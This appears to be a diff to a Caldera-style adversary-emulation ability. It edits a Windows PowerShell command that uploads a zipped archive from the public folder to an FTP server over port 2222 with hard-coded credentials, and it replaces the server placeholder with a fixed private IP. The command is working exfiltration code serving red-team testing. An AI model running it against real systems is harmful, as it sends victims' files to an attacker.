@@ -12,7 +12,7 @@
   - platform: windows
     cleanup: []
     variations: []
-    timeout: 60
+    timeout: 180 
     additional_info: {}
     name: psh
     payloads: []
@@ -22,31 +22,31 @@
     code: null
     build_target: null
     command: '
-      $Username = "caldera_user";\n
-      $Password = "caldera";\n
-      $Ftp = "ftp://#{server}";\n
-      $FtpPort = "2222";\n
-      $ArchiveName = "data.zip";\n
-      $LocalStorageDir = "$env:PUBLIC";\n
-      $slash = "/";\n
-      $AntiSlash = "\";\n
-      $Column = ":";\n
-      $FullPathArchive = "$LocalStorageDir$AntiSlash$ArchiveName";\n
-      $RemoteFileName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-$ArchiveName";\n
-      $FtpUri = $Ftp + $Column + $FtpPort + $Slash + $RemoteFileName;\n
-      $Uri=[system.URI] $FtpUri;\n
-      $FtpUpload = [System.Net.FtpWebRequest]::Create("$FtpUri");\n
-      $FtpUpload = [System.Net.FTPWebRequest]$FtpUpload;\n
-      $FtpUpload.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;\n
-      $FtpUpload.Credentials = New-Object System.Net.NetworkCredential($Username,$Password);\n
-      $FtpUpload.UseBinary = $true;\n
-      $FtpUpload.UsePassive = $true;\n
-      $FileContent = gc -encoding Byte $FullPathArchive;\n
-      $FtpUpload.ContentLength = $FileContent.Length;\n
-      $Run = $FtpUpload.GetRequestStream();\n
-      $Run.Write($FileContent, 0, $FileContent.Length);\n
-      $Run.Close();\n
-      $Run.Dispose();\n
+      $Username = "caldera_user";
+      $Password = "caldera";
+      $Ftp = "ftp://192.168.0.149";
+      $FtpPort = "2222";
+      $ArchiveName = "data.zip";
+      $LocalStorageDir = "$env:PUBLIC";
+      $slash = "/";
+      $AntiSlash = "\";
+      $Column = ":";
+      $FullPathArchive = "$LocalStorageDir$AntiSlash$ArchiveName";
+      $RemoteFileName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-$ArchiveName";
+      $FtpUri = $Ftp + $Column + $FtpPort + $Slash + $RemoteFileName;
+      $Uri=[system.URI] $FtpUri;
+      $FtpUpload = [System.Net.FtpWebRequest]::Create("$FtpUri");
+      $FtpUpload = [System.Net.FTPWebRequest]$FtpUpload;
+      $FtpUpload.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;
+      $FtpUpload.Credentials = New-Object System.Net.NetworkCredential($Username,$Password);
+      $FtpUpload.UseBinary = $true;
+      $FtpUpload.UsePassive = $true;
+      $FileContent = gc -encoding Byte $FullPathArchive;
+      $FtpUpload.ContentLength = $FileContent.Length;
+      $Run = $FtpUpload.GetRequestStream();
+      $Run.Write($FileContent, 0, $FileContent.Length);
+      $Run.Close();
+      $Run.Dispose();
       '
   singleton: true
   buckets: []
